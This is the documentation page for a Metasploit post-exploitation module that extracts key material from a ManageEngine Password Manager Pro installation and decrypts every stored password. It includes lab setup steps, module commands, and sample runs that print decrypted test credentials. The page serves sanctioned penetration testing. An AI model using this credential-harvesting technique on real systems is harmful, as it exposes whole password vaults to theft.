## Vulnerable Application

This post module gathers ManageEngine's Password Manager Pro credentials from
the local database. This information is encrypted but all the key materials can
be extracted from the application configuration files and the database itself.

This module simply starts to retrieve the database password, the database
encryption key and the data encryption key, which is used to decrypt passwords
also stored in the database. The result is displayed and stored in the
Metasploit database.

For now, only Linux hosts are supported. This module has been tested with
Password Manager Pro versions 10.5.0 (build 10501) and 12.1.0 (build 12123),
both installed on Ubuntu 20.04.4 (x64).

### Installation

Download `ManageEngine_PMP_64bit.bin` from one of the versions at
https://archives2.manageengine.com/passwordmanagerpro/ and run the installer as
root.

For example:
```
$ curl -O https://archives2.manageengine.com/passwordmanagerpro/12123/ManageEngine_PMP_64bit.bin
$ chmod a+x ManageEngine_PMP_64bit.bin
$ ./ManageEngine_PMP_64bit.bin
```
Follow the step-by-step instructions as they appear on the screen. Enter any
location for the installation base path and select "High availability primary
server".

First, launch Password Manager Pro (PMP) in standalone mode. Depending on the
version, it is sometimes required to accept the License Agreement and select
the license type. If it is the case, select the Free license (`f`).
```
$ cd <installation base path>/bin/
$ ./wrapper ../conf/wrapper_lin.conf
```

Once the first time boot process is finished, access the following URL to make
sure it works: https://127.0.0.1:7272

You can test the module with PMP in standalone mode or continue for a service
installation:
Stop PMP (`Ctrl-C`) and run:
```
$ bash ./pmp.sh install
$ /etc/init.d/pmp-service start
```
PMP will run in the background and logs are located in the `<installation base path>/logs`
folder.

You can refer to the vendor [documentation](https://www.manageengine.com/products/passwordmanagerpro/help/installation.html).

### Setup

To properly test this module, some resources and accounts will need to be added to the database:
1. Access https://127.0.0.1:7272 and login as the main administrator with the default credentials (`admin`:`admin`):
1. Go to the `Resources` section on the left hand panel.
1. In the main panel, select `Add Resource` and `Add Manually`
1. Fill in the required fields (select any type of resource) and click `Save & Proceed`
1. Start adding accounts to this resource by filling the necessary fields and click `Add`
1. Once you have some accounts added, click `Save`
1. Repeat the process to add other resources/accounts


## Verification Steps

1. Install the application (see #Installation)
1. Start msfconsole
1. Get a session
1. Do: `use post/linux/gather/manageengine_password_manager_creds`
1. Do: `run verbose=true session=1`
1. **Verify** the installation is correctly detected
1. **Verify** all the key material is retrieved
1. **Verify** all the accounts are enumerated with their decrypted password
1. Do: `creds`
1. **Verify** the credentials are correctly stored in the database

To test the installation path detection logic, you can repeat the process with
PMP launched both in standalone mode and as a service.

Also, this is interesting to test with both a shell and Meterpreter sessions.

Note that an issue in Meterpreter makes the service detection logic fail to
detect the installation path. The other process detection works normally, so it
doesn't block the module execution.

## Options

### INSTALL_PATH

The Password Manager Pro installation path. If not provided, the module will
try its best to detect it.

### PG_HOST

The PostgreSQL host. Password Manager Pro run PostgreSQL locally by default, so
the default value is `127.0.0.1`.

### PG_PORT

The PostgreSQL port. Default is 2345.

## Scenarios

### Meterpreter session on Ubuntu 20.04.4 - PMP version 12.1.0 (build 12123)

```
msf6 post(linux/gather/manageengine_password_manager_creds) > run verbose=true session=1

[*] Detecting installation path
[*] Trying to detect path from the Password Manager service
[-] `/etc/init.d/pmp-service` is not a symlink and the installation path cannot be detected
[*] Trying to detect path from the Password Manager related processes
[*] Installation path: /opt/ManageEngine/PMP
[*] Getting the database password
[+] Database password: BKPVR8EFqy
[*] Getting the database encryption key
[+] Found the database key configuration: /opt/ManageEngine/PMP/conf/pmp_key.key
[+] Database encryption key: crOKEnAvDftdOiW4u7fnhAD5iDBVksKYfc24mR3BZjE\=
[+] `notesdescription` field value: T-e)>(72LJCC7007
Password Manager Pro Credentials
================================

 Resource Name  Resource URL              Account Notes    Login Name     Password
 -------------  ------------              -----------      ----------     --------
 Resource 1     https://foomsf.com        Admin creds      Administrator  P@ssw0rd!
 Resource 1     https://foomsf.com        Op creds         Operator       MySuperStrongPassword
 Resource 1     https://foomsf.com        Test account     TestUser       12345678
 Resource2      https://mysql.foomsf.com  SQL admin        master         MyP@sswd123$
 Resource2      https://mysql.foomsf.com  web db password  webdb          123webpassW0Rd@

[*] Post module execution completed
msf6 post(linux/gather/manageengine_password_manager_creds) > creds
Credentials
===========

host  origin           service  public         private                realm  private_type  JtR Format
----  ------           -------  ------         -------                -----  ------------  ----------
      192.168.177.152           Administrator  P@ssw0rd!                     Password
      192.168.177.152           Operator       MySuperStrongPassword         Password
      192.168.177.152           TestUser       12345678                      Password
      192.168.177.152           master         MyP@sswd123$                  Password
      192.168.177.152           webdb          123webpassW0Rd@               Password
```

### Shell session on Ubuntu 20.04.4 - PMP version 12.1.0 (build 12123)

```
msf6 post(linux/gather/manageengine_password_manager_creds) > run verbose=true session=2

[*] Detecting installation path
[*] Trying to detect path from the Password Manager service
[*] Installation path: /opt/ManageEngine/PMP
[*] Getting the database password
[+] Database password: BKPVR8EFqy
[*] Getting the database encryption key
[+] Found the database key configuration: /opt/ManageEngine/PMP/conf/pmp_key.key
[+] Database encryption key: crOKEnAvDftdOiW4u7fnhAD5iDBVksKYfc24mR3BZjE\=
[+] `notesdescription` field value: T-e)>(72LJCC7007
Password Manager Pro Credentials
================================

 Resource Name  Resource URL              Account Notes    Login Name     Password
 -------------  ------------              -----------      ----------     --------
 Resource 1     https://foomsf.com        Admin creds      Administrator  P@ssw0rd!
 Resource 1     https://foomsf.com        Op creds         Operator       MySuperStrongPassword
 Resource 1     https://foomsf.com        Test account     TestUser       12345678
 Resource2      https://mysql.foomsf.com  SQL admin        master         MyP@sswd123$
 Resource2      https://mysql.foomsf.com  web db password  webdb          123webpassW0Rd@

[*] Post module execution completed
msf6 post(linux/gather/manageengine_password_manager_creds) > creds
Credentials
===========

host  origin           service  public         private                realm  private_type  JtR Format
----  ------           -------  ------         -------                -----  ------------  ----------
      192.168.177.152           Administrator  P@ssw0rd!                     Password
      192.168.177.152           Operator       MySuperStrongPassword         Password
      192.168.177.152           TestUser       12345678                      Password
      192.168.177.152           master         MyP@sswd123$                  Password
      192.168.177.152           webdb          123webpassW0Rd@               Password
```
